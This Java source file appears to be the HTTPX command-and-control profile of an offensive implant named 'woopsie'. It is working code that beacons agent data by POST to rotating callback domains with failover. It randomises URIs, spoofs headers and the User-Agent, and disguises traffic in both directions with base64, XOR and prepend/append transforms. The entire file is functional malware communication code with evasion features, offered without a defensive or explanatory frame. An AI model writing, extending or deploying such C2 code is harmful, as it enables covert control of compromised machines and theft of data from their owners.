package com.woopsie.profiles;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;
import org.apache.hc.client5.http.classic.methods.HttpPost;
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.apache.hc.core5.http.io.entity.StringEntity;
import org.apache.hc.core5.http.io.entity.EntityUtils;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Advanced HTTPX profile with domain rotation, multiple URIs, and transforms
 */
public class HttpxProfile implements C2Profile {
    private final Config config;
    private final CloseableHttpClient httpClient;
    private final ObjectMapper objectMapper;
    private byte[] aesKey;
    
    // Httpx-specific configuration
    private final List<String> callbackDomains;
    private final String domainRotation;
    private final int failoverThreshold;
    private final HttpxConfig httpxConfig;
    private int roundRobinIndex = 0;
    
    public HttpxProfile(Config config) {
        this.config = config;
        this.httpClient = HttpClients.createDefault();
        this.objectMapper = new ObjectMapper();
        this.aesKey = null;
        
        // Parse httpx configuration from config
        this.callbackDomains = parseCallbackDomains();
        this.domainRotation = config.getDomainRotation();
        this.failoverThreshold = config.getFailoverThreshold();
        this.httpxConfig = parseHttpxConfig();
        
        Config.debugLog(config, "HTTPX Profile initialized:");
        Config.debugLog(config, "  Domains: " + callbackDomains);
        Config.debugLog(config, "  Rotation: " + domainRotation);
        Config.debugLog(config, "  Failover threshold: " + failoverThreshold);
    }
    
    private List<String> parseCallbackDomains() {
        try {
            String domainsJson = config.getCallbackDomains();
            if (domainsJson != null && !domainsJson.isEmpty()) {
                JsonNode domains = objectMapper.readTree(domainsJson);
                List<String> result = new ArrayList<>();
                if (domains.isArray()) {
                    for (JsonNode domain : domains) {
                        result.add(domain.asText());
                    }
                }
                return result;
            }
        } catch (Exception e) {
            Config.debugLog(config, "Failed to parse callback domains: " + e.getMessage());
        }
        // Fallback to single callback host
        return Collections.singletonList(config.getCallbackUrl());
    }
    
    private HttpxConfig parseHttpxConfig() {
        try {
            String rawC2Config = config.getRawC2Config();
            if (rawC2Config != null && !rawC2Config.isEmpty()) {
                JsonNode configNode = objectMapper.readTree(rawC2Config);
                return objectMapper.treeToValue(configNode, HttpxConfig.class);
            }
        } catch (Exception e) {
            Config.debugLog(config, "Failed to parse httpx config: " + e.getMessage());
        }
        return new HttpxConfig(); // Return empty config as fallback
    }
    
    @Override
    public String send(String data) throws Exception {
        String domain = selectDomain();
        String uri = selectUri();
        String url = domain + uri;
        
        Config.debugLog(config, "HTTPX POST to: " + url);
        Config.debugLog(config, "  Selected domain: " + domain);
        Config.debugLog(config, "  Selected URI: " + uri);
        
        // Apply rotation strategy
        switch (domainRotation.toLowerCase()) {
            case "round-robin":
            case "random":
                return sendToSingleDomain(url, data);
            case "fail-over":
            default:
                return sendWithFailover(data);
        }
    }
    
    private String sendToSingleDomain(String url, String data) throws Exception {
        // Apply client transforms
        byte[] transformedData = applyClientTransforms(data.getBytes(StandardCharsets.UTF_8));
        
        HttpPost post = new HttpPost(url);
        
        // Apply headers
        post.setHeader("User-Agent", config.getUserAgent());
        post.setHeader("Content-Type", "application/json");
        
        if (httpxConfig.post != null && httpxConfig.post.client != null && 
            httpxConfig.post.client.headers != null) {
            for (Map.Entry<String, String> header : httpxConfig.post.client.headers.entrySet()) {
                post.setHeader(header.getKey(), header.getValue());
            }
        }
        
        post.setEntity(new StringEntity(new String(transformedData, StandardCharsets.UTF_8)));
        
        try (CloseableHttpResponse response = httpClient.execute(post)) {
            int statusCode = response.getCode();
            byte[] responseBytes = EntityUtils.toByteArray(response.getEntity());
            
            Config.debugLog(config, "HTTPX response status: " + statusCode);
            
            if (statusCode >= 200 && statusCode < 300) {
                // Apply server transforms (reverse)
                byte[] untransformedData = applyServerTransforms(responseBytes);
                return new String(untransformedData, StandardCharsets.UTF_8);
            } else {
                throw new Exception("HTTPX request failed with status: " + statusCode);
            }
        }
    }
    
    private String sendWithFailover(String data) throws Exception {
        Exception lastException = null;
        
        for (String domain : callbackDomains) {
            String uri = selectUri();
            String url = domain + uri;
            
            for (int attempt = 0; attempt < failoverThreshold; attempt++) {
                try {
                    Config.debugLog(config, "Failover attempt " + (attempt + 1) + " to " + url);
                    return sendToSingleDomain(url, data);
                } catch (Exception e) {
                    Config.debugLog(config, "Attempt failed: " + e.getMessage());
                    lastException = e;
                }
            }
        }
        
        throw lastException != null ? lastException : new Exception("All domains failed");
    }
    
    private String selectDomain() {
        if (callbackDomains.isEmpty()) {
            return config.getCallbackUrl();
        }
        
        switch (domainRotation.toLowerCase()) {
            case "random":
                return callbackDomains.get(new Random().nextInt(callbackDomains.size()));
            case "round-robin":
                String domain = callbackDomains.get(roundRobinIndex % callbackDomains.size());
                roundRobinIndex++;
                return domain;
            case "fail-over":
            default:
                return callbackDomains.get(0);
        }
    }
    
    private String selectUri() {
        if (httpxConfig.post != null && httpxConfig.post.uris != null && !httpxConfig.post.uris.isEmpty()) {
            // Randomly select from available URIs
            return httpxConfig.post.uris.get(new Random().nextInt(httpxConfig.post.uris.size()));
        }
        return config.getPostUri();
    }
    
    private byte[] applyClientTransforms(byte[] data) {
        if (httpxConfig.post == null || httpxConfig.post.client == null || 
            httpxConfig.post.client.transforms == null) {
            return data;
        }
        
        byte[] result = data;
        for (Transform transform : httpxConfig.post.client.transforms) {
            try {
                result = applyTransform(result, transform);
            } catch (Exception e) {
                Config.debugLog(config, "Transform failed: " + transform.action + " - " + e.getMessage());
            }
        }
        return result;
    }
    
    private byte[] applyServerTransforms(byte[] data) {
        if (httpxConfig.post == null || httpxConfig.post.server == null || 
            httpxConfig.post.server.transforms == null) {
            return data;
        }
        
        byte[] result = data;
        // Server transforms are applied in reverse
        List<Transform> transforms = httpxConfig.post.server.transforms;
        for (int i = transforms.size() - 1; i >= 0; i--) {
            try {
                result = applyTransformReverse(result, transforms.get(i));
            } catch (Exception e) {
                Config.debugLog(config, "Reverse transform failed: " + transforms.get(i).action + " - " + e.getMessage());
            }
        }
        return result;
    }
    
    private byte[] applyTransform(byte[] data, Transform transform) throws Exception {
        switch (transform.action.toLowerCase()) {
            case "base64":
                return Base64.getEncoder().encode(data);
            case "base64url":
                return Base64.getUrlEncoder().withoutPadding().encode(data);
            case "prepend":
                return concatenate(transform.value.getBytes(StandardCharsets.UTF_8), data);
            case "append":
                return concatenate(data, transform.value.getBytes(StandardCharsets.UTF_8));
            case "xor":
                return xor(data, transform.value.getBytes(StandardCharsets.UTF_8));
            default:
                Config.debugLog(config, "Unknown transform: " + transform.action);
                return data;
        }
    }
    
    private byte[] applyTransformReverse(byte[] data, Transform transform) throws Exception {
        switch (transform.action.toLowerCase()) {
            case "base64":
                return Base64.getDecoder().decode(data);
            case "base64url":
                return Base64.getUrlDecoder().decode(data);
            case "prepend":
                int prependLen = transform.value.getBytes(StandardCharsets.UTF_8).length;
                return Arrays.copyOfRange(data, prependLen, data.length);
            case "append":
                int appendLen = transform.value.getBytes(StandardCharsets.UTF_8).length;
                return Arrays.copyOfRange(data, 0, data.length - appendLen);
            case "xor":
                return xor(data, transform.value.getBytes(StandardCharsets.UTF_8));
            default:
                Config.debugLog(config, "Unknown reverse transform: " + transform.action);
                return data;
        }
    }
    
    private byte[] concatenate(byte[] a, byte[] b) {
        byte[] result = new byte[a.length + b.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }
    
    private byte[] xor(byte[] data, byte[] key) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }
    
    @Override
    public byte[] getAesKey() {
        return aesKey;
    }
    
    @Override
    public void setAesKey(byte[] key) {
        this.aesKey = key;
    }
    
    @Override
    public String getProfileName() {
        return "httpx";
    }
    
    // Configuration classes for httpx
    static class HttpxConfig {
        public Endpoint post;
        public Endpoint get;
    }
    
    static class Endpoint {
        public List<String> uris = new ArrayList<>();
        public EndpointClient client;
        public EndpointServer server;
    }
    
    static class EndpointClient {
        public Map<String, String> headers;
        public List<Transform> transforms;
    }
    
    static class EndpointServer {
        public List<Transform> transforms;
    }
    
    static class Transform {
        public String action;
        public String value;
    }
}
